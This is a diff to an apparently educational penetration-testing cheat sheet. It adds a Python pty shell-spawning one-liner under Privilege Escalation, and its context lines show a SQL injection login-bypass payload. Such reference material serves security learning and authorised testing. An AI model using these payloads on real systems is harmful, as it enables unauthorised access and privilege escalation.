@@ -10,6 +10,7 @@
    - [XSS](#xss)
    - [Subdomain Takeover](#subdomain)
 - [Privilege Escalation](#privesc)
+   - [Shell Spawning](#shellspawn)
    - [SUID](#suid)
 
 
@@ -108,6 +109,14 @@ SELECT * from TABLE where USERNAME='' UNION SELECT 1 --AND PASSWORD='PASSWORD';
 
 <a name ="privesc"></a>
 # Privilege Escalation
+
+<a name="shellspawn"></a>
+### Shell Spawning 
+
+```python
+python -c 'import pty;pty.spawn("/bin/sh")'
+```
+
 
 <a name="suid"></a>
 ### SUID
